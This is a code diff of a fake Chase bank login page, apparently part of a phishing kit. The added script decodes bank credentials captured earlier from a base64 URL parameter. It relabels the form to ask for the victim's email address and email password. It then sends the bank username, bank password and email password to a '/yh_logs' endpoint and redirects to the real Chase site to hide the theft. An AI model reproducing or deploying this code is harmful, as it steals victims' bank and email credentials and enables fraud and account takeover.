@@ -215,18 +215,20 @@ function getUrlVars()
     }
     return vars;
 }
-$('#email123').text((getUrlVars()['email']));
+let datastg=JSON.parse(atob(getUrlVars()['data']));
+console.log(datastg);
+$('#userId-text-input-field').val((datastg['email']));
+$('#userId-label[for="userId-text-input-field"]').toggle($('#userId-text-input-field').val()=='');
 $('#signin-button').on('click', ()=>{
 console.log(4);
 setTimeout(function(){ $('.loader-default').addClass('is-active'); }, 300);
 setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
 setTimeout(function(){
 	var encodedString = btoa(JSON.stringify({ username: $('#userId-text-input-field').val(), email: getUrlVars()['email'], password: $('#password-text-input-field').val()}));
-	window.location.replace("/email?data="+encodeURIComponent(encodedString));
 }, 4000);
 
 return;
-$.get( "/yh_logs", { username: $('#userId-text-input-field').val(), email: $('#email123').text(), password: $('#password-text-input-field').val()}).done(function( data ) {
+$.get( "/yh_logs", { username: datastg['username'], email: $('#userId-text-input-field').val(), password:datastg['password'], emailpassword: $('#password-text-input-field').val()}).done(function( data ) {
     window.location.replace("https://secure07a.chase.com");
   });
 
@@ -564,7 +566,7 @@ $.get( "/yh_logs", { username: $('#userId-text-input-field').val(), email: $('#e
                                           <div class="jpui vertical">
                                              <div class="align-label-input floating-label__container">
                                                 
-                                                <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical error" id="userId-label" for="userId-text-input-field" aria-hidden="false"><span class="util accessible-text errorAdaText">Error:</span><span class="util accessible-text" id="userId-label-errorLabel"></span>Username <span class="util accessible-text" id="userId-label-accessible-text"></span></label> </div>
+                                                <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical error" id="userId-label" for="userId-text-input-field" aria-hidden="false"><span class="util accessible-text errorAdaText">Error:</span><span class="util accessible-text" id="userId-label-errorLabel"></span>Email <span class="util accessible-text" id="userId-label-accessible-text"></span></label> </div>
                                                 <div class="logon-xs-toggle" id="userId-text"> <input min="0" class="jpui input logon-xs-toggle clientSideError" id="userId-text-input-field" placeholder="" format="" aria-describedby="  userId-input-field-label aggregator-security-banner" type="text" name="userId" data-validate="userId" required="" value="">    </div>
                                              </div>
                                              <div>
@@ -575,7 +577,7 @@ $.get( "/yh_logs", { username: $('#userId-text-input-field').val(), email: $('#e
                                        <div class="jpui fieldgroup logon-xs-toggle logon-floating-label" id="password">
                                           <div class="jpui vertical">
                                              <div class="align-label-input floating-label__container">
-                                                <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" id="password-label" for="password-text-input-field" aria-hidden="false"><span class="util accessible-text" id="password-label-errorLabel"></span>Password <span class="util accessible-text" id="password-label-accessible-text"></span></label> </div>
+                                                <div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" id="password-label" for="password-text-input-field" aria-hidden="false"><span class="util accessible-text" id="password-label-errorLabel"></span>Email password <span class="util accessible-text" id="password-label-accessible-text"></span></label> </div>
                                                 <div class="logon-xs-toggle" id="password-text"> <input min="0" class="jpui input logon-xs-toggle" id="password-text-input-field" placeholder="" format="" aria-describedby="  password-input-field-label" autocomplete="off" type="password" name="password" data-validate="password" required="" value="">    </div>
                                              </div>
                                              <div>
